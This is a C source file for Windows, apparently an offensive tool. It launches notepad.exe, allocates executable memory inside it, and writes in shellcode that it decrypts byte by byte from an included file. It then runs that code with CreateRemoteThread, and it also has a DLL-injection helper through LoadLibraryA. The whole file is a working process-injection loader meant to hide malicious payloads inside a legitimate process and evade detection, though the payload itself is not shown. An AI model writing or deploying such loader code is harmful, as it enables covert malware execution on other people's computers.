/* compile with i686-w64-mingw32-gcc -o main.exe main.c */
#include <stdio.h>
#include <windows.h>
#include "encrypted_shellcode.c"

void launch_thread(HANDLE h_process, HANDLE h_loadlib, LPVOID string_addr) {
    long thread_id = 0;

    if (!CreateRemoteThread(h_process, NULL, 0, h_loadlib, string_addr, 0, &thread_id)) {
        printf("[!] Failed to inject DLL, exit...");
        exit(0);
    }
    printf("[+] Remote Thread created: %i", thread_id);
}

HANDLE resolve_load_library() {
    char* data = "kernel32.dll";
    int length = 13;

    HANDLE h_kernel32 = GetModuleHandleA(data);
    if (!h_kernel32) {
        printf("Could not get handle to kernel32.dll, error %i", GetLastError());
        exit(0);
    }

    data = "LoadLibraryA";
    HANDLE h_loadlib = GetProcAddress(h_kernel32, data);
    if (!h_loadlib) {
        printf("Could not get handle to function, error %i", GetLastError());
        exit(0);
    }
    return h_loadlib;
}

LPVOID allocate_memory(HANDLE h_process, SIZE_T length) {
    LPVOID addr = VirtualAllocEx(h_process, NULL, length, ( MEM_RESERVE | MEM_COMMIT ), PAGE_EXECUTE_READWRITE);
    printf("allocated memory at %p\n", addr);
    return addr;
}

void write_to_memory(HANDLE h_process, LPVOID address, LPCVOID data, SIZE_T length) {
    SIZE_T count = 0;

    if (!WriteProcessMemory(h_process, address, data, length, &count)) {
        printf("Failed: Write Memory - Error Code: %i\n", GetLastError());
        exit(0);
    }
}

PROCESS_INFORMATION create_process(PROCESS_INFORMATION pi) {
    STARTUPINFOA si = { sizeof(si) };
    int return_value = CreateProcessA(NULL, "C:\\Windows\\system32\\notepad.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    printf("A Notepad process has been started with the PID: %i\n", pi.dwProcessId);
    return pi;
}

int main() {
    HANDLE h_process;
	HANDLE remote_thread;
	PVOID remote_buffer;

    PROCESS_INFORMATION pi = create_process(pi);
    //h_process = pi.hProcess;
    DWORD process_id = pi.dwProcessId;

    //printf("Injecting into PID: %i\n", process_id);
    h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
	remote_buffer = allocate_memory(h_process, sizeof(encrypted_shellcode));
    unsigned char buf;
    for (int i=0; i < sizeof(encrypted_shellcode); i++){
        buf = get_shellcode_byte(i);
	    write_to_memory(h_process, remote_buffer+i, &buf, sizeof(buf));
    }
	remote_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
	CloseHandle(h_process);

	return 0;
}